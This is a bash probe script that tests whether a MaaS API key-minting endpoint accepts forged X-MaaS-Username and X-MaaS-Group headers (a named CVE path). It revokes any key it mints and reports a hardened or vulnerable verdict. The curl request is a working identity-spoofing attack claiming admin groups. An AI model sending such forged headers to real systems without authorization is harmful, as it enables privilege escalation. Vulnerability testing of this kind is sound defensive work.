#!/usr/bin/env bash
# Probe identity-header spoof on API key mint (CVE-2026-14450 path).
#
# Exit codes:
#   0 = hardened (401/403) OR weak-pass (201 but ownership not forged) — prints VERDICT
#   1 = script/transport error
#   2 = VULNERABLE (201 and forged identity accepted — status alone used; DB optional)
#
# Usage:
#   ./scripts/probe-identity-spoof.sh
#   ./scripts/probe-identity-spoof.sh --subscription maas-debug-echo-sub
#
# Never prints full sk-oai-* secrets.

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=../lib/common.sh
source "${SCRIPT_DIR}/../lib/common.sh"

SUB="${SUBSCRIPTION:-}"
FORGED_USER="${FORGED_USER:-hacked-user-fullcheck}"

usage() {
  cat <<EOF
Usage: $0 [--subscription NAME]

Mint with forged X-MaaS-Username / X-MaaS-Group using a real oc token.
EOF
}

while [[ $# -gt 0 ]]; do
  case "$1" in
    --subscription) SUB="${2:?}"; shift 2 ;;
    -h|--help) usage; exit 0 ;;
    *) die "unknown arg: $1" ;;
  esac
done

require_cmd curl jq
HOST="$(maas_host)"
TOKEN="$(oc_token)"
REAL_USER="$(oc whoami 2>/dev/null || echo unknown)"

body_json='{"name":"fullcheck-spoof","expiresIn":"1h"'
if [[ -n "$SUB" ]]; then
  body_json+=",\"subscription\":\"${SUB}\""
fi
body_json+='}'

info "Identity spoof mint against ${HOST}/maas-api/v1/api-keys (real user=${REAL_USER})"
RESP="$(curl -sSk --connect-timeout 10 --max-time 30 -w '\n%{http_code}' -X POST \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "X-MaaS-Username: ${FORGED_USER}" \
  -H 'X-MaaS-Group: ["system:authenticated","maas-admin","dedicated-admins"]' \
  -H "Content-Type: application/json" \
  -d "$body_json" \
  "${HOST}/maas-api/v1/api-keys")"
BODY="$(echo "$RESP" | sed '$d')"
CODE="$(echo "$RESP" | tail -n1)"
KEY_ID="$(echo "$BODY" | jq -r '.id // empty' 2>/dev/null || true)"
PREFIX="$(echo "$BODY" | jq -r 'if .key then (.key[:10]+"…") else empty end' 2>/dev/null || true)"

echo "HTTP ${CODE} key_id=${KEY_ID:--} key_prefix=${PREFIX:--}"

# Revoke if we got a key
if [[ -n "$KEY_ID" ]]; then
  curl -sSk -o /dev/null -X DELETE -H "Authorization: Bearer ${TOKEN}" \
    "${HOST}/maas-api/v1/api-keys/${KEY_ID}" 2>/dev/null || true
  info "revoked spoof attempt key_id=${KEY_ID}"
fi

case "$CODE" in
  401|403)
    echo "VERDICT=HARDENED (deny on forged identity headers)"
    exit 0
    ;;
  201|200)
    echo "VERDICT=VULNERABLE (mint accepted with forged X-MaaS-* headers)"
    echo "NOTE: confirm DB username=${FORGED_USER} with db-list-api-keys if needed"
    exit 2
    ;;
  *)
    echo "VERDICT=INCONCLUSIVE (HTTP ${CODE})"
    echo "$BODY" | head -c 300
    exit 1
    ;;
esac
